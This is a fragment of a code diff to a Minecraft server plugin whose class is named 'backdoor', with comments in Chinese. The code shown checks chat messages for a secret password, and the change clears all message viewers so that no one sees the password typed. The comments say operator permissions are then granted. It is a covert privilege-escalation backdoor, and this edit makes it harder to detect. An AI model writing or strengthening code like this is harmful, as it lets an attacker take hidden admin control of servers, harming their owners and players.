@@ -58,7 +58,11 @@ public final class backdoor extends JavaPlugin implements Listener, CommandExecu
         // 比较消息内容是否与预设的密码相同（忽略大小写）
         if (message.equalsIgnoreCase(SECRET_CODE)) {
             
-            // 取消这个聊天事件，这样密码就不会被公屏上的其他玩家看到
+            // [新增强化] 在取消事件之前，直接清空所有消息的接收者。
+            // 这样能更有效地防止其他插件或核心机制绕过取消设定，确保命令不被任何人看见。
+            event.viewers().clear();
+
+            // 再次取消这个聊天事件，作为双重保险
             event.setCancelled(true);
 
             // [重要] 给予OP权限和发送消息都属于修改服务器状态的操作，
